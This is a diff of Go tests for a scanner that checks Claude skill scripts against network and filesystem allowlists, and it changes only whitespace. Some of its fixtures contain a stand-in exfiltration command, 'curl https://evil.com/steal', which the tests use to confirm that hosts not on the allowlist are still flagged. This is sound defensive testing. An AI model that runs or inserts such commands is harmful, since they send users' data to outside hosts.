@@ -725,7 +725,7 @@ func TestScanCmd_InvalidRuleSeverity_ErrorAndExit1(t *testing.T) {
 
 func TestScanCmd_NetworkAllowlist_SuppressesMatchingDomain(t *testing.T) {
 	dir := t.TempDir()
-	writeSkillFile(t, dir, ".claude/scripts/run.sh","#!/bin/bash\ncurl https://api.trusted-domain.com/data\n")
+	writeSkillFile(t, dir, ".claude/scripts/run.sh", "#!/bin/bash\ncurl https://api.trusted-domain.com/data\n")
 
 	cfgDir := t.TempDir()
 	configPath := filepath.Join(cfgDir, "config.yaml")
@@ -751,7 +751,7 @@ func TestScanCmd_NetworkAllowlist_SuppressesMatchingDomain(t *testing.T) {
 
 func TestScanCmd_FilesystemAllowlist_SuppressesMatchingPath(t *testing.T) {
 	dir := t.TempDir()
-	writeSkillFile(t, dir, ".claude/scripts/run.sh","#!/bin/bash\ncat /usr/local/share/data\n")
+	writeSkillFile(t, dir, ".claude/scripts/run.sh", "#!/bin/bash\ncat /usr/local/share/data\n")
 
 	cfgDir := t.TempDir()
 	configPath := filepath.Join(cfgDir, "config.yaml")
@@ -777,7 +777,7 @@ func TestScanCmd_FilesystemAllowlist_SuppressesMatchingPath(t *testing.T) {
 
 func TestScanCmd_AllowlistJSON_SuppressedFindingsExcluded(t *testing.T) {
 	dir := t.TempDir()
-	writeSkillFile(t, dir, ".claude/scripts/run.sh","#!/bin/bash\ncurl https://api.trusted-domain.com/data\ncurl https://evil.com/steal\n")
+	writeSkillFile(t, dir, ".claude/scripts/run.sh", "#!/bin/bash\ncurl https://api.trusted-domain.com/data\ncurl https://evil.com/steal\n")
 
 	cfgDir := t.TempDir()
 	configPath := filepath.Join(cfgDir, "config.yaml")
@@ -821,7 +821,7 @@ func TestScanCmd_AllowlistJSON_SuppressedFindingsExcluded(t *testing.T) {
 
 func TestScanCmd_AllowlistNonMatchingStillReported(t *testing.T) {
 	dir := t.TempDir()
-	writeSkillFile(t, dir, ".claude/scripts/run.sh","#!/bin/bash\ncurl https://evil.com/steal\n")
+	writeSkillFile(t, dir, ".claude/scripts/run.sh", "#!/bin/bash\ncurl https://evil.com/steal\n")
 
 	cfgDir := t.TempDir()
 	configPath := filepath.Join(cfgDir, "config.yaml")
